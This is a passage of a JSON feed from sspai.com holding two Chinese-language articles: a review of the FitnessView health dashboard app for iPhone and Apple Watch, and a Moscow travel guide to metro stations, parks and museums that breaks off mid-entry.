[{"title":"WaterMinder 开发者新作，好看直观的个人健康仪表盘：FitnessView","date":"2021-08-28 07:00:00","description":"\n<p>如果你购买了一块 Apple Watch，开始了每天严格自律的健身之旅，那么你或许和我一样，为了掌握自己的运动和健康数据要不断地在系统自带的健康和健身应用里反复横跳，既要通过健身应用查看当天的健身进度，又要通过健康应用了解自己的各项活动趋势。</p>\n<p>如果你在意自己的健康数据，经常使用自带的健康应用，就不难发现，尽管健康应用已经尽可能多地将我们可能关心的数据罗列了出来，但是在摘要界面，我们手动收藏的数据顺序却只能随缘排列。</p>\n<p>正是因为自带应用还有其待完善之处，所以和健康相关的第三方应用才会层出不穷，它们或着眼于结果的美观呈现，或着眼于更加精细的数据分析。FitnessView 是由 WaterMinder 开发者最新推出的一款应用，它将呈现结果与分析数据进行了结合，方便我们在一个应用里管理自己的健康及健身数据。</p>\n<h2>追踪活动情况，设定每日目标</h2>\n<p>初次使用，我们需要给予 FitnessView 对健康数据的读写权限，完成这一步后，我们在 FitnessView 最先看到便是老朋友——活动圆环，之后我们便可以在「今日目标」中添加想要监控的健康数据。</p>\n<p>以睡眠为例，当我们将「睡眠」设置为活跃状态并为这一活动设置相应目标后，便能够在「今日目标」和「统计数据」界面看到当天的睡眠目标完成进度和相关的统计数据。当 FitnessView 追踪到我们完成所设定的目标时，会在主界面显示五彩纸屑来庆祝这一小小的成就。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4erd5db34tb0b5qhbs0.jpeg\"></figure><p>基本上，自带健康应用可以追踪的活动类型、营养元素等在 FitnessView 当中都能被添加，但身体测量数据及女性生理期追踪等并未纳入其中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4erd5lb34tb094k584g.jpeg\"></figure><p>FitnessView 会在主页默认显示活动、目标和近期锻炼三类数据，如果你只想在主页简单查看自己的目标完成情况，可以在设置中将主页的活动和锻炼数据显示关闭。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4erd5tb34tb0b5qhbsg.jpeg\"></figure><h2>统计健康数据，记录每一次锻炼</h2>\n<p>除了主界面外，FitnessView 还将统计数据与锻炼数据进行了分开展示，其中统计数据一栏所展示的数据与我们在首页添加的目标项目完全一致。在这一页面，我们所追踪的各项数据均以卡片形式展示，相关数值则以柱状图的形式呈现，我们可以方便地以天、周、月、年为统计周期查看自己的活动趋势，点击相应的卡片后还能进一步查看包括趋势变化、平均值等在内的更为细致的数据。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4erd65b34tb0b5qhbt0.jpeg\"></figure><p>FitnessView 对于锻炼数据的呈现方式十分有趣。除了列出以往的锻炼记录外，FitnessView 还会对我们以往的锻炼进行分类统计，方便我们了解同一类型下相关锻炼的次数。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4erd6db34tb0oe0vvcg.jpeg\"></figure><p>此外，FitnessView 还针对锻炼给出了统计月历，月历上会用彩色圆点的形式展示当天的锻炼情况，而圆点上的色彩比率则和我们当天锻炼的强度相关。通过观察统计月历我们便能对每一天的锻炼强度做到一目了然。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4erd6lb34tb0b5qhbtg.jpeg\"></figure><h2>多类型小组件支持，通过桌面掌握必要信息</h2>\n<p>数据展示是 FitnessView 的一大重要功能，除了在应用内做好了详细的分类展示外， FitnessView 还充分利用不同尺寸的小组件来展示数据概览。系统内置的健康应用完全不支持小组件，即便是想要简单地查看某一数据也必须进入应用内才能完成，而 FitnessView 则将小组件作为了重要的展示窗口，不仅尺寸支持完善，而且还充分给予了用户自定义小组件的自由。</p>\n<p>FitnessView 在设置当中内置了一个小组件合集，在这里我们可以对默认的小组件进行项目、颜色和主题设置，也可以结合自己的使用情况，手动添加新的小组件样式。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4erd6tb34tb0h9pkkng.jpeg\"></figure><p>尤为方便的一点是， FitnessView 允许我们在设置好相关的小组件后随时调整其活跃状态，当小组件状态为「活跃」时，我们可以随时在桌面更改相应的小组件，而当小组件状态设置为「不活跃」时，桌面的小组件设置便会将其从选项中隐藏，为了避免混淆，我们可以在设置小组件时就做好命名管理以方便后期更改。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4erd75b34tb0b5qhbu0.jpeg\"></figure><p>另一个和小组件相关的贴心功能是，对于展示单个目标或活动的小组件，FitnessView 支持用户设置点击小组件后的动作。</p>\n<p>以「站立时间」为例，当打开方式设置为「打开应用」时，点击这一小组件会直接进入FitnessView 应用主界面，而当打开方式设置为「打开详情界面时」，点击小组件则会直接进入站立时间的统计详情页。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4erd7db34tb0b5qhbug.jpeg\"></figure><p>当然，由于 FitnessView 对于小组件的自定义支持过于丰富，难以在此一一列举，本文不再赘述。</p>\n<h2>充分支持 Apple Watch，玩转复杂功能</h2>\n<p>Apple Watch 是 iPhone 健康和健身数据的重要来源，如果脱离了 Apple Watch，我们得到的健康数据的数量和精度均会大打折扣，所以一定程度上，使用 FitnessView 的前提就是你要有一块 Apple Watch。</p>\n<p>作为一款智能手表，Apple Watch 对于很多使用者而言也是一个信息展示的小窗口，FitnessView 就对 Apple Watch 提供了完备的支持。FitnessView 对于所有支持添加复杂功能的表盘都给出了详细的设置，通过 FitnessView 的内部设置，我们可以对想要在表盘上展示的复杂功能进行细致的自定义，从数据类型再到各个元素的颜色，乃至进度条的显示样式和文本的显示值，你想到的想不到的功能通过 FitnessView 均能实现完全的自定义。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4erd7lb34tb0h9pkko0.jpeg\"></figure><p>相比于在小小的表盘上费力点选，FitnessView 和自家的 WaterMinder 这种在手机应用上就能设置表盘复杂功能的设计显然更加方便和人性化。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4erd7tb34tb0b5qhbv0.jpeg\"></figure><h2>总结</h2>\n<p>总的来说，就和在 App Store 里的介绍一样，FitnessView 主要还是起到了一个健康仪表盘的作用，尽管它允许用户设定目标，但却没有内建相应的成就系统。如果你想要一个美观、清晰的健康数据统计和展示应用，FitnessView 会是一个不错的选择。但能否坚持运动，能否坚持健康的生活，最终还是要看使用者自己的决心和毅力，这是任何应用都无法帮助我们完成的。</p>\n<p>你可以通过 <a href=\"https://apps.apple.com/cn/app/fitnessview-%E5%81%A5%E5%BA%B7%E4%BB%AA%E8%A1%A8%E6%9D%BF/id1531983371\" target=\"_blank\">App Store</a> 下载体验 FitnessView。应用采用了订阅和买断两种付费方式，订阅价格为 10 元 / 月或 63 元 / 年，买断价格为 98 元，应用提供三天的免费试用，你可以在试用后决定是否要为其付费。</p>\n<span class=\"ss-application\" app-id=\"16145\"> </span><p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68370"},{"title":"城市收藏夹｜魂断莫斯科","date":"2021-08-28 03:42:51","description":"\n<h2>Пролог｜前言：莫斯科，一座城市。</h2>\n<p>莫斯科。一座城市，它没有欧洲那种规整的街巷、两边都是充满异国风情的小型楼房，因为它不能算得上是一座欧洲的城市。在莫斯科更多的是一种独特的风格，它有着俄罗斯最古老的传统、有着些许欧洲的情调，还有着苏联的那种冰冷的技术风格；所有这些都在莫斯科的街巷中留下了不少印记。</p>\n<p>如果你在红场和克里姆林宫周围闲逛，可能见到的是莫斯科河对岸工厂烟囱吐出的烟雾、也可能是克里姆林宫没有屋檐的红色城墙、也可能是巴洛克风格或者现代主义风格的那种外墙装饰；低矮的楼房算不上整齐、但也不能说是错落有致：它们反而是华丽接着庄严，再接着一种浪漫的情调，让人觉得目不暇接。如果你登上儿童百货的楼顶俯瞰，你能看到川流不息的各种车辆从特维尔大街驶来，也能看到克里姆林宫钟楼上的那些闪闪发光的红星。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggn1db34tfrff2a7f0.jpeg\"></figure><p>但是如果你在麻雀山一带逗留，风景就变了。市中心你看到的那些东西，在这里全部变成了一种苏联式的宏伟和千篇一律。对宏大本身的一种崇拜和喜好成就了苏联建筑这种错综复杂却又庞大无比的风格：莫斯科大学的主楼本身容纳了从学生宿舍到教室的各种房间，从外面看它仿佛一头猛兽般强大；而它对面的图书馆则是一个弧形的大型建筑，从广场走到入口要花上至少五分钟。而如果你选择遁入居民区，那就会见到一幢幢上个世纪兴建的公寓楼似乎和中国那些 90 年代的公寓建筑没有什么区别：方块状、白色的外墙上，有着不少水渍和裂纹，窗户看起来小小的、黑黑的，入口看起来十分阴森，而楼道就更甚。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggn1tb34tfrff2a7fg.jpeg\"></figure><p>喜欢公园和绿地的人，应该会很喜欢莫斯科。俄罗斯精神总是强调对于自然的回归：这可能是为什么莫斯科的公园都如此庞大而有趣。高尔基公园（文化公园）、VDNKh、索科尔尼基、察里津诺，每个公园中都有着大片的绿地：夏天的时候它们成为了人们休憩最好的去处，甚至有很多政府放置的懒人沙发，你会看到很多当地人在这里晒日光浴，一本杂志、一杯冰饮就是一个下午的时光；而冬天的时候，这些地方都会变身冰雪世界，沿着公园道路铺设的大型冰场上，总能看到年轻人在随着音乐舞动、或者看到初学者小心翼翼在冰上挪动，生怕摔倒：但是脸上的开心却都是真实的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggn25b34tfrff2a7g0.jpeg\"></figure><p>莫斯科的另外一个名声，就是它是一座博物馆之城。常常是，当你在莫斯科城中心的宽街窄巷中游走的时候，突然就能看到一座博物馆在一个不知名的小巷尽头，静静等待人们去发现。它的主题可不好说：建筑博物馆就在红场一侧的后方，靠近列宁图书馆的位置；东方艺术博物馆则在阿尔巴特街的尽头向北走的尼基金大街上；举世闻名的特列季亚科夫画廊也并非在什么显眼的位置，而是在拉夫鲁申斯基巷中，非要拐上好几个弯才能找到它。在博物馆的旅程，就好像一次朝圣吧。我们所崇拜的一切美好和记忆，都在一座不大的建筑中安静等待，而无论是自然的创造还是人类的创造，都因为人类赋予了它意义而充满意义。</p>\n<h2>Начинаем с метро | 让我们从地铁开始说起</h2>\n<p>莫斯科地铁第一次开始运营是 1935 年，现在以列宁的名字命名（列宁莫斯科地铁系统，Московский метрополитен им. В. И. Ленина）。莫斯科地铁一直以来都有着「地下宫殿」的名声：如果你走进其中的几座车站，就会被富丽堂皇的站厅装饰所震惊。很多旅游团前往莫斯科，都会将一些莫斯科的地铁站作为专门的旅游景点；我们当年在莫斯科上课的时候，也的确常常被老师推荐前往地铁站进行考察。可以说，莫斯科的地铁，在实用性之外，常常拥有一些艺术风格。这种风格，我觉得在某种程度上也对北京比较老的地铁（比如 1、2 号线）有所影响。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggn2lb34tfratjikeg.png\"><figcaption>莫斯科地铁全图 2021 年版，来自 <a href=\"https://en.wikipedia.org/wiki/Moscow_Metro\">维基百科</a></figcaption></figure><p>如果你观察莫斯科的地铁图，可能立刻就会联想到蜘蛛网。没错，莫斯科城市的环形规划设计，使得她的主干道很少有指向正南或者正北的。而地铁也基本延续了地面道路的走向修建。你会看到内部的一条棕色的环形地铁线，那就是莫斯科的「二环」花园环路。在这条线上几乎所有的车站都连接着莫斯科前往俄罗斯（或者前苏联）各大城市的火车站：基辅（如今的乌克兰首都）、列宁格勒（如今的圣彼得堡）、明斯克（如今的白俄罗斯首都）、斯摩棱斯克等等。说起来，也是有趣：莫斯科和圣彼得堡的火车站命名是以铁路的目的地命名的：所以，白俄罗斯站的列车开往白俄罗斯，基辅站的列车开往基辅，列宁格勒站的列车开往圣彼得堡（不过，这一站地铁是共青团站 - Комсомольская）等等。</p>\n<p>正因为莫斯科地铁站的密度很高，在莫斯科，所有的商店等公共场所都会在地址后面写上离自己最近的地铁站。这篇文章中提到的一些东西，我也会以地铁站 + 地址的方式呈现。</p>\n<p>不过，在说到具体的景点之前，让我们先看看「沿途的风景」。莫斯科地铁站的装饰富有特色，而且站站不重样。我们说几个最出名的，带大家领略一下莫斯科的「地下宫殿」。说地铁站之前，还有一件事情需要澄清：在莫斯科，可以换乘的站可能是不同的名字：例如，1 号线「猎人商行（Охотный ряд）」站、2 号线「剧院（Театральная）」站和 3 号线「革命广场（Площадь революции）」站可以互相换乘，但是它们的名字、装饰风格等等都各有不同。</p>\n<h3>最深的地铁站：胜利公园站（Парк Победы）</h3>\n<p>位于莫斯科城市的西部，胜利公园是为纪念二战胜利而建。而胜利公园附近的这座地铁站也因为它突出的深度而出名，为地铁 3 号线与 8A 线的换乘站点。互联网上众说纷纭：有的说它的深度达到了 90 米（大约 30 层楼深）；有的说是 74 米，还有说 80、84 米的 —— 但是，它实际的深度，根据公开的数据，大约 73 米。这是算上了主要扶梯的高度 63.4 米、站厅小斜坡的高度 3.6 米、与地面之间的大厅的高度 4.94 米，以及站台与轨道之间的距离 1.1 米。不过，即使是「只有」73 米，这也足以让胜利公园站成为世界上最深的地铁站之一。在这里乘车的感受就是，进站之后花在扶梯上的时间，你差不多可以听完大半首歌。顺便说一句，莫斯科地铁通常都没有楼梯或者是直行的电梯，都是电扶梯。一般来说，人们会站在地铁扶梯的右侧，把左侧让出来供赶时间的人急行。不过，如果是在胜利公园站，你如果选择走上扶梯的话，可能真的会累得够呛。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggn35b34tfsrleb4c0.jpeg\"></figure><p>胜利公园站的站厅一如「胜利公园」本身的意义：它显得庄严、肃穆，光滑的大理石地板与立柱，再加上异常明亮的天花板，都给人一种严肃感。</p>\n<h3>最具运气的地铁站：革命广场站（Площадь революции）</h3>\n<p>革命广场站位于市中心，这里可以换乘 1 号线「猎人商行」站与 2 号线「剧院」站。革命广场站的站厅有近十座拱形门连接站台和走廊，每座拱形门旁都伫立着精美的黄铜雕像，雕像一共 76 座。雕像刻画的是前苏联不同职业的人物，象征着前苏联历史时代的过渡 —— 其中有工人、农民、戍边战士、海军信号员，也有学生、工程师、运动员。雕像本身十分美轮美奂、形象传神，是社会现实主义风格的杰作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggn3db34tfrff2a7gg.jpeg\"></figure><p>不过，雕像本身除了观赏价值之外，据说还能给人带来「好运气」。比如，如果是学生，在考试前摸一摸「戍边战士与猎犬」像的狗鼻子，那么他的考试就一定会通过；还有迷信是，如果你在一天的早晨摸一摸信号员手里的旗子，那么你这一天都会过得很成功。这些迷信，必然是无稽之谈 —— 但是这并不影响莫斯科市民凑热闹的热情。如果你现在去地铁站，就会看到我上面说的两个地方，早就被蹭的锃亮了。</p>\n<p>我本人也有幸在考试之前去地铁站摸了一下狗鼻子。说实话，效果还不错。如果你也想有好运气，就到这里摸摸铜像吧 —— 说不定好运就来了。</p>\n<h3>如果你想一览前苏联风采：基辅站（Киевская）</h3>\n<p>基辅站是莫斯科地铁 3、4、5 三线的换乘站，不过今天我们说的是 5 号线，也就是环线的基辅站，于 1954 年开放。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggn3tb34tfr0h6drhg.jpeg\"></figure><p>我曾经不止一次在基辅站见到旅游团：中国的、俄罗斯本地的都有，似乎这个站就是一个传统的旅游景点。基辅站的站厅尽管算不上金碧辉煌，但是你仔细看的话，就会发现站厅回廊的画着用俄罗斯传统的马赛克艺术拼贴而成的苏联社会生活的宣传画（主题大多是宣扬俄罗斯与乌克兰的民族友谊，毕竟这里是「基辅」站），而在站厅尽头的墙上则是小幅的列宁像、锦旗，还有苏联国歌歌词中的一句：「自由的祖国，你无比光辉：各民族友爱的坚固堡垒！」</p>\n<h3>华丽得好像贵族的舞厅：马雅可夫斯基站（Маяковская）</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggn4db34tfrff2a7h0.jpeg\"></figure><p>1938 年开放的马雅可夫斯基站是 2 号线上的一站，位于莫斯科市中心城区的西北部，距离俄罗斯音乐博物馆、柴可夫斯基音乐厅等都不算太远。这座地铁站的站厅，尽管在主体上更接近斯大林时期的新古典主义风格，但是其细节性的元素无疑给予了它一些俏皮的装饰风艺术特点：圆形的穹顶里安装了一圈灯，房顶把灯光柔和反射到地面，使整个站厅呈现出温和明亮的色彩；站厅到站台的拱门使用了具有金属色泽和反射作用的钢材作为装饰，使得整个站厅都显得活泼起来；站台对面的墙上也有着细致、优雅的纹理作为装饰。整个站厅简洁、高雅，让人简直分不清，这里到底是地铁站，还是哪位贵族人家的舞厅。</p>\n<h3>横跨莫斯科河的地铁站：麻雀山站（Воробьевы горы）</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggn4lb34tfsrleb4cg.jpeg\"></figure><p>位于莫斯科城市西南的麻雀山站可以说一扫一直在地下感受到的「沉闷」：还记得我第一次坐 1 号线经过这里，真的是眼前一亮。列车从山口窜出，然后进入这个封闭的站厅，停靠在站台，而你可以在站台的两侧看到落地窗，窗外是莫斯科河以及两边被葱郁的植被覆盖的麻雀山（夏天），或者是皑皑白雪与冰封的河面（冬天）。这座车站横跨莫斯科河，因此是莫斯科地铁站中唯一一座有窗户的车站，也是为数不多在地上的车站，也是站台最长的一站。如果你从这里下车，你既可以通过窗户欣赏麻雀山和莫斯科河的风景，当然也可以选择出站在麻雀山公园逛一逛，旁边就是卢日尼基体育场（1980 年莫斯科奥运会和 2018 年俄罗斯世界杯的比赛场地）；而一个地铁站开外就是著名的莫斯科大学主楼。</p>\n<h2>Летом - лужайки, а зимой - катки. | 夏天是草坪，冬天是滑冰场。</h2>\n<p>在前言里我也提到，莫斯科是一个有很多公园和绿地的城市。自然，提到莫斯科，大多数人可能想到的都是阴暗的冬天，银装素裹、白雪纷飞。但是莫斯科的公园无论冬天还是夏天，都别有一番景致。大片的公园和绿地不仅给莫斯科市民休闲娱乐带来了便利，也让我这个留学生当年十分坐不住，一有机会就要去公园活动活动。</p>\n<h3>文化公园（高尔基公园）- Парк культуры и отдыха им. Горького</h3>\n<p>📍位置：克里米亚堤岸街 9 号</p>\n<p>💰 门票：入口无需门票，内部博物馆等其他项目另计</p>\n<p>🚇 地铁：Октябрьская - 十月 (5, 6) / Парк культуры - 文化公园 (1)</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggn55b34tfr0h6dri0.jpeg\"></figure><p> </p>\n<p>高尔基公园，也叫文化公园，的面积很大。可以从很多入口进入高尔基公园，不过大多数人可能都会从地铁站附近，位于克里米亚堤岸街上的那个大门进入公园，这也是公园的正门。正门相对的就是一大水池，其中有喷泉。如果是夏天前往，晚间时分，喷泉会随着音乐的节奏舞动，总是可以吸引许多游人驻足观看。</p>\n<p>在大门与喷泉水池中间还有一大片广场。这里有时候会举办演出。例如，胜利日（在俄罗斯是 5 月 9 日）的时候，这里就举办了露天的交响乐会，完全免费，你可以路过的时候听上几小节，也可以坐在台阶或者草坪上仔细聆听交响乐团奏出的美妙曲调。</p>\n<p>夏天的高尔基公园游人如织。而且，你会在这里发现许多有趣的活动 —— 不像国内大多数公园管理严格，在高尔基公园的道路和绿地上，你可以见到许多年轻人正在玩滑板或者是滑板车；此外，公园还提供许多其他的设施器材租借：乒乓球和球拍、轮滑鞋乃至自行车，都可以排队按照一定的价格租借，在规定时间前归还即可。因此，在高尔基公园你可以选择度过一个很有活力的下午：在莫斯科河岸的微风中在滑板车上滑行，观赏横跨莫斯科河的桥上，人们坐在桥的最高点眺望远处；或者是在乒乓球台与自己的好友一较高下，如果累了就从旁边和善的售货员手中买来一只棉花糖，一边舔着一边欣赏灵动的音乐喷泉；当然，也可以到公园里的一处池塘泛舟。</p>\n<p>总之，高尔基公园是周末、假期放松自己的好去处。你可以选择多活动活动，也可以只是懒懒地躺在草坪上晒太阳，也可以在公园里的画廊中闲逛 —— 「文化公园」的名字，可不是白叫的。</p>\n<h3>察里津诺庄园 - Царицыно</h3>\n<p>📍位置：秋林那街 1 号</p>\n<p>💰 门票：无需门票，内部博物馆、温室等其他项目另计</p>\n<p>🚇 地铁：Царицыно - 察里津诺 (2)</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggn5db34tfsrleb4d0.jpeg\"></figure><p>察里津诺庄园依照俄罗斯大帝叶卡捷琳娜二世的要求而建，位于莫斯科的东南市郊。昔日的宫殿与园林，如今已经是人们休闲的好去处。庄园的面积相当大，如果你想要逛完全园无疑要花上一天的时间，毕竟除了园林本身，庄园中的建筑被改建成了博物馆，其中的藏品包括近代皇家的一些用具，以及现代的艺术作品，值得一看；此外，庄园中还有几间温室，其中，人们可以在莫斯科这样的亚寒带见到稀罕的热带植物。另外，庄园中也有一大片池塘，上面设置了喷泉，还养了不少禽类 —— 还记得那是我第一次见到那么多绿头鸭子在绿茵地上飞驰。</p>\n<p>据说，因为房间矮小、楼阁显得紧紧巴巴，叶卡捷琳娜二世并不喜欢这座庄园的建筑与宫殿。不过，这并不能阻止后世的我们欣赏其独特的建筑风格，以及如今内部陈列的珍贵展品。如果你是夏天前往，还很有可能看到一大片郁金香盛放在离庄园门口不远的位置，显示出勃勃的生机。也是在这里，你可以在林荫草坪上找到大型的懒人沙发，许多游人就在懒人沙发上躺着晒太阳、读书、享用饮料。</p>\n<p>去察里津诺，我还是更推荐夏天。晴天的时候喷泉开放、鲜花盛开的景象，配合着耀眼的阳光，总是让人感到美得甚至有些虚幻了；相比之下，冬天的察里津诺没那么有意思，阴沉的天气和庄园本来的阴森都让人觉得有点凄凉，甚至是恐怖。</p>\n<h3>国家经济建设成就展 - ВДНХ</h3>\n<p>📍位置：世界大道 119 号</p>\n<p>💰 门票：无需门票，内部博物馆等其他项目另计</p>\n<p>🚇 地铁：ВДНХ - 国家经济建设成就展 (6)</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggn65b34tfsrleb4dg.jpeg\"></figure><p>ВДНХ，我觉得冬天特别有意思。尽管这可能是因为我夏天的时候没有去过（实在是有点太远了），但是冬天的有趣体现在它是全俄罗斯最大的露天滑冰场之一。随着冬天的到来，莫斯科的气温会下降到 -10 度乃至更低；这个时候，莫斯科的几大公园纷纷「变身」—— 往日的林间小径已经被铺上了冰，成为了滑冰的路径；而横跨冰场的是一些阶梯和天桥，游人可以在上面观看下面的人滑冰乃至在冰上跳舞的景象。</p>\n<p>尽管俄罗斯人有着「近水楼台先得月」的先天优势，但也不是所有人都能够在滑冰场上如鱼得水，也有不少初学者踉踉跄跄开始自己的滑冰之旅。其实，只要你小时候滑过轮滑或者旱冰，冰刀也并没有那么难以驾驭。很快，你就能体会到「速度与激情」；当然，也可能体会到的是「在哪里跌倒，就从哪里爬起来」。滑冰的乐趣就在于此吧：冬日里在严寒的侵蚀之下，你可以在冰上尽情随音乐舞动，挥洒汗水，还能和朋友一起竞速；初学者尽管步履蹒跚但也能够自娱自乐；当然，摔倒的尴尬时刻也有人与你分享。如果是饿了、累了，滑冰场一般也有一些提供便餐的地方。</p>\n<p>ВДНХ 冬天的滑冰场不算太贵，我当时（2017 年）是 700 卢布（约合人民币 80 元），可以从下午 5 点一直滑到晚上 11 点（当然，如果有人真的能滑 6 个小时，我也是佩服），时间足够人们玩个尽兴。还记得当时带朋友一起去，一开始他还不太乐意（因为不会），但是学会了以后他显然觉得自己很「厉害」，最后我们一直待到散场，后半夜才回到住的地方。</p>\n<h3>Парк Зарядье</h3>\n<p>📍位置：瓦尔瓦拉大街 6 号</p>\n<p>💰 门票：无需门票，内部博物馆等其他项目另计</p>\n<p>🚇 地铁：Охотный ряд - 猎人商行 (1) / Театральная - 剧院 (2) / Площадь революции - 革命广场 (3)</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggn6lb34tfr0h6drig.jpeg\"></figure><p>Зарядье 公园就在红场旁边 —— 穿过红场，在瓦西里升天教堂的背后，你就能看到这个开放式的公园。公园的设计理念是把俄罗斯的各种地貌都包括进去，有冻土、灌木、森林，也有四季常温的生态馆。公园的中间部分有一座桥伸向莫斯科河的中部，绕了一个弯儿又转回来，极具设计感的同时，也可以一览莫斯科河两岸的风光，河中的游船，以及不远处河岸边的莫斯科斯大林式高楼「七姊妹」之一的艺术家公寓。</p>\n<p>到了夜晚，这里的灯光秀和远处的大教堂交相辉映，又是另一番景象。夜空中，你也能见到克里姆林宫尖顶上闪闪照耀的红星。</p>\n<h2>Город музеев.｜博物馆的城市</h2>\n<p>莫斯科也以它各种各样的博物馆而闻名，可以说是一座「博物馆的城市」。除了我们常见的美术馆和各类主题博物馆，名人故居也是遍布整个莫斯科。博物馆在莫斯科人的眼里可能是十分稀松平常的东西：博物馆常常人满为患不说，你还经常能见到一群小朋友在老师的指导下进行「博物馆探秘」。除了小朋友，可以说从 18 岁到 80 岁的人，你都能在博物馆见到。博物馆本身的意义就在于收藏人类的或者自然的创造。从这个意义上来说，它们是最能够代表人类文明的。</p>\n<h3>特列季亚科夫画廊（新馆、老馆）- Третьяковская галерея (Новая и старая)</h3>\n<p>📍位置：（老馆）拉夫鲁申斯基巷 10 号｜（新馆）克里米亚堤岸街 10 号</p>\n<p>💰 门票：新馆、老馆不同，一般在 550 卢布左右（约合 50 元人民币）</p>\n<p>🚇 地铁：（老馆）Третьяковская - 特列季亚科夫 (6/8) / Новокузнецкая - 新库兹涅佐夫(2)｜（新馆）Октябрьская - 十月 (5/6) / Парк культуры - 文化公园 (1)</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggn75b34tfr0h6drj0.jpeg\"></figure><p>特列季亚科夫是 19 世纪末、20 世纪初活跃于俄罗斯的一位富商。当年的俄罗斯，有许多像他这样经商的同时也乐意资助艺术家进行创作的商界大佬。特列季亚科夫一生购买、资助和定制了许多画作，都存放在他的宅邸之中。后来，他决定成立特列季亚科夫画廊，把俄罗斯优秀画家的艺术作品向公众开放展示 —— 这就是位于拉夫鲁申斯基巷的特列季亚科夫老馆，现在主要收藏的是 19 世纪及之前俄罗斯艺术家的画作，以及一些雕塑。新馆则是以他的名字命名，主要收藏了 20 世纪以来俄罗斯艺术家的画作（象征主义、先锋派等等），也会举办一些其他的现代艺术展览。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggn7db34tfsrleb4e0.jpeg\"></figure><p>毫不避讳地说，特列季亚科夫画廊是整个莫斯科城市之中，我最能够推荐的博物馆。其中，老馆我去过五六次，新馆也有三四次。它的容量足够你逛上一整天 —— 而且，如果你真的很喜欢某一幅画，你可能可以在前面驻足很久，观察它的每一处细节。我至今还记得第一次看到伊万诺夫的杰作《基督现世》时的震撼：这幅两人多高的画作展现了当基督款款向人们走来的时候，不同社会阶层、职业、种族的人们的不同反应，十分传神。这里你不仅仅可以看到西式油画的发展历史，更能看到俄罗斯文化的发展历史。老馆一个特别对国人友好的地方在于<strong>提供中文语音导览</strong>租借服务，而且品质颇高，所以你可以无障碍地了解名作背后的故事。从肖像画、风景画到圣像画、抽象艺术，这里展示的是最为纯正的俄罗斯风格与俄罗斯精神。</p>\n<h3>历史博物馆 - Исторический музей</h3>\n<p>📍位置：红场 1 号</p>\n<p>💰 门票：约 30 人民币</p>\n<p>🚇 地铁：Охотный ряд - 猎人商行 (1) / Театральная - 剧院 (2) / Площадь революции - 革命广场 (3)</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ggn7tb34tfrff2a7hg.jpeg\"></figure><p>红场旁边的历史博物馆是一座你不可能错过的建筑：红色的外墙是如此鲜艳，而冬日莫斯科的白雪只会让它显得更加明亮。这座博物馆主要介绍的是俄罗斯的历史，从远古时代俄罗斯土地上的文明出土文物，到俄罗斯建国、沙皇的产生时的一些物品和文件，直到近代俄罗斯人的服装、书籍等等，这里都有收藏。</p>\n<p>作为历史博物馆的分部，位于红场另一头的瓦西里升天大教堂如今也已经被改造成了一座俄罗斯东正教主题的博物馆。教堂内部介绍了俄罗斯教堂的基本结构、礼拜活动的流程，展示了不少仪式器具；同时，你也可以探索内部狭窄的楼梯空间，从狭窄的窗户窥见红场和莫斯科河的风景。作为俄罗斯的标志之一，这座教堂本身的名气的确要大于其中的展品，不过博物馆仍然值得一看。</p>\n<h3>普希金造型艺术博物馆 Государственный музей изобразительных искусств имени А.С. Пушкина</h3>\n<p>📍位置：沃尔洪卡街 12 号</p>\n<p>💰 门票：500 卢布，约合 45 元人民币</p>\n<p>🚇 地铁：Кропоткинская - 克拉伯特金斯基 (1)</p>\n<figure class=\"image ss-img-wrapper\"><img 